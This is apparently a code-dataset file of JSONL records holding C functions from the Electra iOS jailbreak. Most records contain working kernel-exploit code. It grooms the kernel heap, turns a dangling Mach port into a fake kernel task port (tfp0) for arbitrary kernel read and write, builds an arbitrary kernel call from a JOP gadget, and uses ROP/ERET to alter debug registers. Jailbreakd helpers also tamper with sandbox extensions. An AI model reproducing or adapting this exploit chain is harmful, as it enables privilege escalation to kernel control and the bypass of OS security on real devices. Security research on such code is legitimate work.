{"docstring": "/*\n * the first tpf0 we get still hangs of the dangling port and is backed by a type-confused ipc_kmsg buffer\n *\n * use that tfp0 to build a safer one such that we can safely free everything this process created and exit\n * without leaking memory\n */\n", "func_signal": "mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space)", "code": "{\n  kern_return_t err;\n\n  mach_port_t tfp0 = MACH_PORT_NULL;\n  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tfp0);\n  if (err != KERN_SUCCESS) {\n    printf(\"unable to allocate port\\n\");\n  }\n\n  // build a fake struct task for the kernel task:\n  //uint64_t fake_kernel_task_kaddr = kmem_alloc_wired(0x4000);\n  uint64_t fake_kernel_task_kaddr = early_kalloc(0x1000);\n  printf(\"fake_kernel_task_kaddr: %llx\\n\", fake_kernel_task_kaddr);\n  \n  void* fake_kernel_task = malloc(0x1000);\n  memset(fake_kernel_task, 0, 0x1000);\n  *(uint32_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references\n  *(uint32_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;\n  *(uint64_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;\n  *(uint8_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;\n  kmemcpy(fake_kernel_task_kaddr, (uint64_t) fake_kernel_task, 0x1000);\n  free(fake_kernel_task);\n  \n  uint32_t fake_task_refs = rk32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));\n  printf(\"read fake_task_refs: %x\\n\", fake_task_refs);\n  if (fake_task_refs != 0xd00d) {\n    printf(\"read back value didn't match...\\n\");\n  }\n\n    convert_port_to_task_port(tfp0, space, fake_kernel_task_kaddr);\n  \n  printf(\"about to test new tfp0\\n\");\n  \n  vm_offset_t data_out = 0;\n  mach_msg_type_number_t out_size = 0;\n  err = mach_vm_read(tfp0, vm_map, 0x40, &data_out, &out_size);\n  if (err != KERN_SUCCESS) {\n    printf(\"mach_vm_read failed: %x %s\\n\", err, mach_error_string(err));\n    sleep(3);\n    exit(EXIT_FAILURE);\n  }\n\n  printf(\"kernel read via second tfp0 port worked?\\n\");\n  printf(\"0x%016llx\\n\", *(uint64_t*)data_out);\n  printf(\"0x%016llx\\n\", *(uint64_t*)(data_out+8));\n  printf(\"0x%016llx\\n\", *(uint64_t*)(data_out+0x10));\n  printf(\"0x%016llx\\n\", *(uint64_t*)(data_out+0x18));\n  \n  return tfp0;\n}", "path": "electra/electra/exploit/async_wake.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// get a kalloc allocation before we've got a kcall interface to just call it\n", "func_signal": "uint64_t early_kalloc(int size)", "code": "{\n  mach_port_t port = MACH_PORT_NULL;\n  kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);\n  if (err != KERN_SUCCESS) {\n    printf(\"unable to allocate port\\n\");\n  }\n  \n  uint64_t port_kaddr = find_port_address(port, MACH_MSG_TYPE_MAKE_SEND);\n  \n  struct simple_msg  {\n    mach_msg_header_t hdr;\n    char buf[0];\n  };\n  \n  mach_msg_size_t msg_size = message_size_for_kalloc_size(size);\n  struct simple_msg* msg = malloc(msg_size);\n  memset(msg, 0, msg_size);\n  \n  msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);\n  msg->hdr.msgh_size = msg_size;\n  msg->hdr.msgh_remote_port = port;\n  msg->hdr.msgh_local_port = MACH_PORT_NULL;\n  msg->hdr.msgh_id = 0x41414142;\n  \n  err = mach_msg(&msg->hdr,\n                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,\n                 msg_size,\n                 0,\n                 MACH_PORT_NULL,\n                 MACH_MSG_TIMEOUT_NONE,\n                 MACH_PORT_NULL);\n  \n  if (err != KERN_SUCCESS) {\n    printf(\"early kalloc failed to send message\\n\");\n  }\n  \n  // find the message buffer:\n  \n  uint64_t message_buffer = rk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));\n  printf(\"message buffer: %llx\\n\", message_buffer);\n  \n  // leak the message buffer:\n  wk64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);\n  wk32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000); // this is two uint16_ts, msg_count and qlimit\n  \n  \n  return message_buffer;\n}", "path": "electra/electra/exploit/early_kalloc.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// another random constant\n", "func_signal": "mach_port_t get_kernel_memory_rw()", "code": "{\n  // offsets are required before we get r/w:\n  offsets_init();\n  \n  kern_return_t err;\n  \n  uint32_t MAX_KERNEL_TRAILER_SIZE = 0x44;\n  uint32_t replacer_body_size = message_size_for_kalloc_size(4096) - sizeof(mach_msg_header_t);\n  uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;\n  \n  printf(\"message size for kalloc.4096: %d\\n\", message_size_for_kalloc_size(4096));\n\t\n\t// Creates a user client\n  prepare_user_client();\n\t\n\t\n  \n  uint64_t task_self = task_self_addr();\n  if (task_self == 0) {\n    printf(\"unable to disclose address of our task port\\n\");\n    sleep(10);\n    exit(EXIT_FAILURE);\n  }\n  printf(\"our task port is at 0x%llx\\n\", task_self);\n  \n  int n_pre_ports = 100000; //8000\n  mach_port_t* pre_ports = prepare_ports(n_pre_ports);\n  \n  // make a bunch of smaller allocations in a different zone which can be collected later:\n  uint32_t smaller_body_size = message_size_for_kalloc_size(1024) - sizeof(mach_msg_header_t);\n  \n  uint8_t* smaller_body = malloc(smaller_body_size);\n  memset(smaller_body, 'C', smaller_body_size);\n  \n  const int n_smaller_ports = 600; // 150 MB\n  mach_port_t smaller_ports[n_smaller_ports];\n  for (int i = 0; i < n_smaller_ports; i++) {\n    smaller_ports[i] = send_kalloc_message(smaller_body, smaller_body_size);\n  }\n  \n  // now find a suitable port\n  // we'll replace the port with an ipc_kmsg buffer containing controlled data, but we don't\n  // completely control all the data:\n  // specifically we're targetting kalloc.4096 but the message body will only span\n  // xxx448 -> xxxfbc so we want to make sure the port we target is within that range\n  // actually, since we're also putting a fake task struct here and want\n  // the task's bsd_info pointer to overlap with the ip_context field we need a stricter range\n  \n  \n  int ports_to_test = 100;\n  int base = n_pre_ports - 1000;\n\n  mach_port_t first_port = MACH_PORT_NULL;\n  uint64_t first_port_address = 0;\n  \n  for (int i = 0; i < ports_to_test; i++) {\n    mach_port_t candidate_port = pre_ports[base+i];\n    uint64_t candidate_address = find_port_address(candidate_port, MACH_MSG_TYPE_MAKE_SEND);\n    uint64_t page_offset = candidate_address & 0xfff;\n    if (page_offset > 0xa00 && page_offset < 0xe80) { // this range could be wider but there's no need\n      printf(\"found target port with suitable allocation page offset: 0x%016llx\\n\", candidate_address);\n      pre_ports[base+i] = MACH_PORT_NULL;\n      first_port = candidate_port;\n      first_port_address = candidate_address;\n      break;\n    }\n  }\n  \n  if (first_port == MACH_PORT_NULL) {\n    printf(\"unable to find a candidate port with a suitable page offset\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  \n  uint64_t* context_ptr = NULL;\n  uint8_t* replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, 0, 0, &context_ptr);\n  printf(\"replacer_body_size: 0x%x\\n\", replacer_body_size);\n  printf(\"message_body_offset: 0x%x\\n\", message_body_offset);\n  \n  make_dangling(first_port);\n  \n  free_ports(pre_ports, n_pre_ports);\n  \n  // free the smaller ports, they will get gc'd later:\n  for (int i = 0; i < n_smaller_ports; i++) {\n    mach_port_destroy(mach_task_self(), smaller_ports[i]);\n  }\n\n  \n  // now try to get that zone collected and reallocated as something controllable (kalloc.4096):\n\n  const int replacer_ports_limit = 200; // about 200 MB\n  mach_port_t replacer_ports[replacer_ports_limit];\n  memset(replacer_ports, 0, sizeof(replacer_ports));\n  uint32_t i;\n  for (i = 0; i < replacer_ports_limit; i++) {\n    uint64_t context_val = (context_magic)|i;\n    *context_ptr = context_val;\n    replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);\n    \n    // we want the GC to actually finish, so go slow...\n    pthread_yield_np();\n    usleep(10000);\n      if (i%20 == 0) {\n          printf(\"%d\\n\", i);\n      }\n  }\n  \n\n  // find out which replacer port it was\n  mach_port_context_t replacer_port_number = 0;\n  err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);\n  if (err != KERN_SUCCESS) {\n    printf(\"unable to get context: %d %s\\n\", err, mach_error_string(err));\n    sleep(3);\n    exit(EXIT_FAILURE);\n  }\n  replacer_port_number &= 0xffffffff;\n  if (replacer_port_number >= (uint64_t)replacer_ports_limit) {\n    printf(\"suspicious context value, something's wrong %lx\\n\", replacer_port_number);\n    sleep(3);\n    exit(EXIT_FAILURE);\n  }\n  \n  printf(\"got replaced with replacer port %ld\\n\", replacer_port_number);\n\n  prepare_rk_via_kmem_read_port(first_port);\n  \n  uint64_t kernel_vm_map = find_kernel_vm_map(task_self);\n  printf(\"found kernel vm_map: 0x%llx\\n\", kernel_vm_map);\n  \n  \n  // now free first replacer and put a fake kernel task port there\n  // we need to do this becase the first time around we don't know the address\n  // of ipc_space_kernel which means we can't fake a port owned by the kernel\n  free(replacer_message_body);\n  replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, kernel_vm_map, ipc_space_kernel(), &context_ptr);\n  \n  // free the first replacer\n  mach_port_t replacer_port = replacer_ports[replacer_port_number];\n  replacer_ports[replacer_port_number] = MACH_PORT_NULL;\n  mach_port_destroy(mach_task_self(), replacer_port);\n  \n  const int n_second_replacer_ports = 10;\n  mach_port_t second_replacer_ports[n_second_replacer_ports];\n  \n  for (int i = 0; i < n_second_replacer_ports; i++) {\n    *context_ptr = i;\n    second_replacer_ports[i] = send_kalloc_message(replacer_message_body, replacer_body_size);\n  }\n  \n  // hopefully that worked the second time too!\n  // check the context:\n  \n  replacer_port_number = 0;\n  err = mach_port_get_context(mach_task_self(), first_port, &replacer_port_number);\n  if (err != KERN_SUCCESS) {\n    printf(\"unable to get context: %d %s\\n\", err, mach_error_string(err));\n    sleep(3);\n    exit(EXIT_FAILURE);\n  }\n  \n  replacer_port_number &= 0xffffffff;\n  if (replacer_port_number >= (uint64_t)n_second_replacer_ports) {\n    printf(\"suspicious context value, something's wrong %lx\\n\", replacer_port_number);\n    sleep(3);\n    exit(EXIT_FAILURE);\n  }\n  \n  printf(\"second time got replaced with replacer port %ld\\n\", replacer_port_number);\n  \n  // clear up the original replacer ports:\n  for (int i = 0; i < replacer_ports_limit; i++) {\n    mach_port_destroy(mach_task_self(), replacer_ports[i]);\n  }\n  \n  // then clear up the second replacer ports (apart from the one in use)\n  mach_port_t second_replacement_port = second_replacer_ports[replacer_port_number];\n  second_replacer_ports[replacer_port_number] = MACH_PORT_NULL;\n  for (int i = 0; i < n_second_replacer_ports; i++) {\n    mach_port_destroy(mach_task_self(), second_replacer_ports[i]);\n  }\n  \n  printf(\"will try to read from second port (fake kernel)\\n\");\n  // try to read some kernel memory using the second port:\n  vm_offset_t data_out = 0;\n  mach_msg_type_number_t out_size = 0;\n  err = mach_vm_read(first_port, kernel_vm_map, 0x40, &data_out, &out_size);\n  if (err != KERN_SUCCESS) {\n    printf(\"mach_vm_read failed: %x %s\\n\", err, mach_error_string(err));\n    sleep(3);\n    exit(EXIT_FAILURE);\n  }\n  \n  printf(\"kernel read via fake kernel task port worked?\\n\");\n  printf(\"0x%016llx\\n\", *(uint64_t*)data_out);\n  printf(\"0x%016llx\\n\", *(uint64_t*)(data_out+8));\n  printf(\"0x%016llx\\n\", *(uint64_t*)(data_out+0x10));\n  printf(\"0x%016llx\\n\", *(uint64_t*)(data_out+0x18));\n  \n  prepare_rwk_via_tfp0(first_port);\n  printf(\"about to build safer tfp0\\n\");\n  \n  //early_kalloc(0x10000);\n  //return 0;\n  \n  mach_port_t safer_tfp0 = build_safe_fake_tfp0(kernel_vm_map, ipc_space_kernel());\n  prepare_rwk_via_tfp0(safer_tfp0);\n  \n  printf(\"built safer tfp0\\n\");\n  printf(\"about to clear up\\n\");\n  \n  // can now clean everything up\n  wk32(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_BITS_ACTIVE | IKOT_NONE);\n  wk64(first_port_address + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT),  0);\n  \n  // first port will soon point to freed memory, so neuter it:\n  uint64_t task_port_addr = task_self_addr();\n  uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n  uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));\n  uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));\n\t\n\t\n//\tmach_ports_register(mach_task_self(), &user_client, 1);\n//\tuint64_t IOSurfaceRootUserClient_port = rk64(task_addr + 0x2e8 + 0x8);\n//\tuint64_t IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n//\tuint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr);\n//\n//\tprintf(\"IOSurfaceRootUserClient_vtab: %016llx\\n\", IOSurfaceRootUserClient_vtab);\n//\tprintf(\"IOSurfaceRootUserClient_vtab[0]: %016llx\\n\", rk64(IOSurfaceRootUserClient_vtab));\n//\tprintf(\"starting assembly of IOSurfaceRootUserClient_vtab[0]: %016llx\\n\", rk64(rk64(IOSurfaceRootUserClient_vtab)));\n//\n//// Use IDA to find the first occurance of the sequence of bytes from \"starting assembly...\" (on 6+ it is a9bf7bfd14000fe3 for IDA)\n//// If you don't have IDA, use a hex editor to find the offset of \"e30f0014fd7bbfa9\", then use `joker -a <offset> kernel`, and use the address returned as the value (again, not sure if asm is the same)\n//#define FIRST_VTAB_LOCATION 0xfffffff0065e19e4\n//\n//\tuint64_t slide = rk64(IOSurfaceRootUserClient_vtab)-FIRST_VTAB_LOCATION;\n//\tprintf(\"slide is maybe %016llx\\n\", slide);\n//\tprintf(\"ooh? %08x\\n\", rk32(slide + 0xFFFFFFF007004000));\n//\n//\tprintf(\"ooh? %s\\n\", (char*)rk64(slide + 0xFFFFFFF00758C000));\n\t\n\t\n  uint32_t port_index = first_port >> 8;\n  const int sizeof_ipc_entry_t = 0x18;\n  \n  // remove all rights\n  wk32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);\n  \n  // clear the ipc_port port too\n  wk64(is_table + (port_index * sizeof_ipc_entry_t), 0);\n  \n  mach_port_destroy(mach_task_self(), second_replacement_port);\n  printf(\"cleared up\\n\");\n  return safer_tfp0;\n}", "path": "electra/electra/exploit/async_wake.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// address if exists, 0 if not\n", "func_signal": "uint64_t _OSDictionary_GetItem(uint64_t dict, const char *key)", "code": "{\n\tsize_t len = strlen(key) + 1;\n\n\tuint64_t ks = kalloc(len);\n\tkwrite(ks, key, len);\n\n\tuint64_t vtab = rk64(dict);\n\tuint64_t f = rk64(vtab + off_OSDictionary_GetObjectWithCharP);\n\n\tint rv = (int) kexecute(f, dict, ks, 0, 0, 0, 0, 0);\n\n\tkfree(ks, len);\n\n\treturn rv;\n}", "path": "electra/basebinaries/jailbreakd/osobject.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// call fptr in the context of the current thread passing arg0 and arg1\n// uses the serializer gadget\n", "func_signal": "void kcall(uint64_t fptr, uint64_t arg0, uint64_t arg1)", "code": "{\n  // allocate some memory to hold a fake iokit object:\n  uint64_t obj_kaddr = kmem_alloc(sizeof(struct fake_iokit_obj)+0x800);\n  \n  // fill in the fields:\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,         vtable), obj_kaddr+0x08); // point this to the next field\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,       refcount), 0x2017);\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           arg0), arg0);\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           arg1), arg1);\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,           fptr), fptr);\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,         retain), ksym(KSYMBOL_RET));\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,        release), ksym(KSYMBOL_OSSERIALIZER_SERIALIZE));\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj,            ign), 0);\n  wk64(obj_kaddr+offsetof(struct fake_iokit_obj, get_meta_class), ksym(KSYMBOL_OSARRAY_GET_META_CLASS));\n  for (int i = 1; i < 0xff; i++) {\n    wk64(obj_kaddr+offsetof(struct fake_iokit_obj, get_meta_class) + (i*8), 0x1010101010101000+(i*4));\n  }\n  \n  // allocate a port\n  mach_port_t port = MACH_PORT_NULL;\n  kern_return_t err;\n  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);\n  if (err != KERN_SUCCESS) {\n    printf(\"failed to allocate port\\n\");\n    return;\n  }\n  \n  // get a send right\n  mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);\n  \n  // locate the port\n  uint64_t port_addr = find_port_address(port, MACH_MSG_TYPE_COPY_SEND);\n  \n  // change the type of the port\n  #define IKOT_IOKIT_OBJECT 30\n  #define IO_ACTIVE   0x80000000\n  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_IOKIT_OBJECT);\n  \n  // cache the current space:\n  uint64_t original_space = rk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));\n  \n  // change the space of the port\n  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());\n  \n  // set the kobject\n  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), obj_kaddr);\n  \n  // call an iokit method\n  IOIteratorReset(port);\n  \n  // clear the kobject\n  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), 0);\n  \n  // reset the space\n  wk64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), original_space);\n  \n  // reset the type\n  #define IKOT_NONE 0\n  wk32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE|IKOT_NONE);\n  \n  // release the port\n  mach_port_destroy(mach_task_self(), port);\n  \n  // free the fake object\n  kmem_free(obj_kaddr, sizeof(struct fake_iokit_obj)+0x800);\n}", "path": "electra/electra/exploit/kcall.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// get 64 higher bits of 64bit int multiplication\n// https://stackoverflow.com/a/28904636\n// ofc in asm it's done with 1 instruction huh\n// XXX there has to be a cleaner way utilizing hardware support\n", "func_signal": "uint64_t mulhi(uint64_t a, uint64_t b)", "code": "{\n\tuint64_t    a_lo = (uint32_t)a;\n\tuint64_t    a_hi = a >> 32;\n\tuint64_t    b_lo = (uint32_t)b;\n\tuint64_t    b_hi = b >> 32;\n\n\tuint64_t    a_x_b_hi =  a_hi * b_hi;\n\tuint64_t    a_x_b_mid = a_hi * b_lo;\n\tuint64_t    b_x_a_mid = b_hi * a_lo;\n\tuint64_t    a_x_b_lo =  a_lo * b_lo;\n\n\tuint64_t    carry_bit = ((uint64_t)(uint32_t)a_x_b_mid +\n\t                         (uint64_t)(uint32_t)b_x_a_mid +\n\t                         (a_x_b_lo >> 32) ) >> 32;\n\n\tuint64_t    multhi = a_x_b_hi +\n\t                     (a_x_b_mid >> 32) + (b_x_a_mid >> 32) +\n\t                     carry_bit;\n\n\treturn multhi;\n}", "path": "electra/basebinaries/jailbreakd/sandbox.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// this runs on the thread which will execute the target syscall to debug\n", "func_signal": "void run_syscall_with_breakpoint(uint64_t bp_address, breakpoint_callback callback, uint32_t syscall_number, uint32_t n_args, ...)", "code": "{\n  // pin this thread to the target cpu:\n  pin_current_thread();\n  \n  // set the Kernel Debug Enable bit of MDSCR_EL1:\n  set_MDSCR_EL1_KDE(mach_thread_self());\n  \n  // MDE will be set by the regular API for us\n  \n  // enable a hw debug breakpoint at bp_address\n  // it won't fire because PSTATE.D will be set, but we'll deal with that in a bit!\n  \n  // set a hardware bp on the thread using the proper API so that all the structures are already set up:\n  struct arm64_debug_state state = {0};\n  state.bvr[0] = bp_address;\n#define BCR_BAS_ALL (0xf << 5)\n#define BCR_E (1 << 0)\n  state.bcr[0] = BCR_BAS_ALL | BCR_E; // enabled\n  kern_return_t err = thread_set_state(mach_thread_self(),\n                                       ARM_DEBUG_STATE64,\n                                       (thread_state_t)&state,\n                                       sizeof(state)/4);\n  \n  // verify that it got set:\n  memset(&state, 0, sizeof(state));\n  mach_msg_type_number_t count = sizeof(state)/4;\n  err = thread_get_state(mach_thread_self(),\n                         ARM_DEBUG_STATE64,\n                         (thread_state_t)&state,\n                         &count);\n  \n  if (state.bvr[0] != bp_address) {\n    printf(\"setting the bp address failed\\n\");\n  }\n  \n  \n  // now go and find that thread's DebugData where those values are stored.\n  \n  uint64_t thread_port_addr = find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);\n  uint64_t thread_t_addr = rk64(thread_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n  \n  printf(\"thread_t_addr: %llx\\n\", thread_t_addr);\n  \n  // read bvr[0] in that thread_t's DebugData:\n  uint64_t DebugData = rk64(thread_t_addr + ACT_DEBUGDATA_OFFSET);\n  //printf(\"DebugData: %llx\\n\", DebugData);\n  \n  uint64_t bvr0 = rk64(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bvr[0]));\n  printf(\"bvr0 read from the DebugData: 0x%llx\\n\", bvr0);\n  \n  uint32_t bcr0 = rk32(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bcr[0]));\n  printf(\"bcr0 read from the DebugData: 0x%08x\\n\", bcr0);\n  \n  // need to manually set this too in the bcr:\n#define ARM_DBG_CR_MODE_CONTROL_ANY (3 << 1)\n  bcr0 |= ARM_DBG_CR_MODE_CONTROL_ANY;\n\n  wk32(DebugData + offsetof(struct arm_debug_aggregate_state, ds64.bcr[0]), bcr0);\n  \n  printf(\"set ARM_DBG_CR_MODE_CONTROL_ANY\\n\");\n  // returning from the syscall should be enough to set it.\n  \n  struct monitor_args* margs = malloc(sizeof(struct monitor_args));\n  margs->target_thread_port = mach_thread_self();\n  margs->breakpoint = bp_address;\n  margs->callback = callback;\n \n  // spin up a thread to monitor when the bp is hit:\n  pthread_t th;\n  pthread_create(&th, NULL, monitor_thread, (void*)margs);\n  printf(\"started monitor thread\\n\");\n  \n  struct syscall_args sargs = {0};\n  sargs.number = syscall_number;\n  va_list ap;\n  va_start(ap, n_args);\n  \n  for (int i = 0; i < n_args; i++){\n    sargs.arg[i] = va_arg(ap, uint64_t);\n  }\n  \n  va_end(ap);\n  \n  // now execute a syscall with PSTATE.D disabled:\n  syscall_complete = 0;\n  do_syscall_with_pstate_d_unmasked(&sargs);\n  syscall_complete = 1;\n  printf(\"syscall returned\\n\");\n  \n  pthread_join(th, NULL);\n  printf(\"monitor exited\\n\");\n\n}", "path": "electra/electra/exploit/kdbg.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "// 1 if yes\n", "func_signal": "int has_file_extension(uint64_t sb, const char* path)", "code": "{\n\tconst char* desc = ent_key;\n\tint found = 0;\n\n\tint slot = hashing_magic(ent_key);\n\tuint64_t insert_at_p = sb + sizeof(void*) + slot * sizeof(void*);\n\tuint64_t insert_at = rk64(insert_at_p);\n\n\twhile (insert_at != 0) {\n\t\tuint64_t kdsc = rk64(insert_at + offsetof(struct extension_hdr, desc));\n\n\t\tif (kstrcmp(kdsc, desc) == 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tinsert_at_p = insert_at;\n\t\tinsert_at = rk64(insert_at);\n\t}\n\n\tif (insert_at != 0) {\n\t\tuint64_t ext_lst = rk64(insert_at + offsetof(struct extension_hdr, ext_lst));\n\n\t\tuint64_t plen = strlen(path);\n\t\tchar *exist = malloc(plen + 1);\n\t\texist[plen] = '\\0';\n\n\t\twhile (ext_lst != 0) {\n\t\t\t// XXX no type/subtype check\n\t\t\tuint64_t data_len = rk64(ext_lst + offsetof(struct extension, data_len));\n\t\t\tif (data_len == plen) {\n\t\t\t\tuint64_t data = rk64(ext_lst + offsetof(struct extension, data));\n\t\t\t\tkread(data, exist, plen);\n\n\t\t\t\tif (strcmp(path, exist) == 0) {\n\t\t\t\t\tfound = 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\text_lst = rk64(ext_lst);\n\t\t}\n\t\t\n\n\t\tfree(exist);\n\t}\n\n\treturn found;\n}", "path": "electra/basebinaries/jailbreakd/sandbox.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
{"docstring": "/*\n we want to call this gadget:\n FFFFFFF0071E1998 MSR #0, c0, c2, #2, X8 ; [>] MDSCR_EL1 (Monitor Debug System Control Register)\n FFFFFFF0071E199C ISB // this a workaround for some errata...\n FFFFFFF0071E19A0 B    loc_FFFFFFF0071E19F8\n ...\n FFFFFFF0071E19F8 BL   _ml_set_interrupts_enabled\n FFFFFFF0071E19FC ADD  SP, SP, #0x220\n FFFFFFF0071E1A00 LDP  X29, X30, [SP,#0x20+var_s0]\n FFFFFFF0071E1A04 LDP  X20, X19, [SP,#0x20+var_10]\n FFFFFFF0071E1A08 LDP  X28, X27, [SP+0x20+var_20],#0x30\n FFFFFFF0071E1A0C RET\n\n lets just use the ERET case to get full register control an run that on a little ROP stack which then\n returns to thread_exception_return\n \n */\n", "func_signal": "void set_MDSCR_EL1_KDE(mach_port_t target_thread_port)", "code": "{\n  /* this state will be restored by an eret */\n  arm_context_t eret_return_state = {0};\n  \n  // allocate a stack for the rop:\n  //uint64_t rop_stack_kern_base = kmem_alloc_wired(0x4000);\n  uint64_t rop_stack_kern_base = early_kalloc(0x1000);\n  \n  uint64_t rop_stack_kern_middle = rop_stack_kern_base + 0xc00;\n  \n  eret_return_state.ss.ss_64.sp = rop_stack_kern_middle;\n  uint64_t rop_stack_kern_popped_base = rop_stack_kern_middle + 0x220;\n  // x28, x27, x20, x19, fp, lr\n  uint64_t popped_regs[] = {0, 0, 0, 0, 0x414243444546, ksym(KSYMBOL_THREAD_EXCEPTION_RETURN)}; // directly return back to userspace after this\n  kmemcpy(rop_stack_kern_popped_base, (uint64_t)popped_regs, sizeof(popped_regs));\n\n#define MDSCR_EL1_KDE (1<<13)\n  eret_return_state.ss.ss_64.x[8] = MDSCR_EL1_KDE;\n  \n  // the target place to eret to\n  eret_return_state.ss.ss_64.pc = ksym(KSYMBOL_SET_MDSCR_EL1_GADGET);\n  \n  // we want to return on to SP0 and to EL1\n  // A,I,F should still be masked, D unmasked (here we could actually mask D?)\n#define SPSR_A   (1<<8)\n#define SPSR_I   (1<<7)\n#define SPSR_F   (1<<6)\n#define SPSR_EL1_SP0 (0x4)\n  eret_return_state.ss.ss_64.cpsr = SPSR_A | SPSR_I | SPSR_F | SPSR_EL1_SP0;\n  \n  //uint64_t eret_return_state_kern = kmem_alloc_wired(sizeof(arm_context_t));\n  uint64_t eret_return_state_kern = early_kalloc(sizeof(arm_context_t));\n  kmemcpy(eret_return_state_kern, (uint64_t)&eret_return_state, sizeof(arm_context_t));\n  \n  // make the arbitrary call\n  kcall(ksym(KSYMBOL_X21_JOP_GADGET), 2, eret_return_state_kern, ksym(KSYMBOL_EXCEPTION_RETURN));\n  \n  printf(\"returned from trying to set the KDE bit\\n\");\n  \n  // free the stack we used:\n  //kmem_free(rop_stack_kern_base, 0x4000);\n}", "path": "electra/electra/exploit/kdbg.c", "commit_date": "2018-01-27 00:00:00", "repo_name": "coolstar/electra", "stars": 657, "license": "gpl-3.0", "language": "c", "size": 53550}
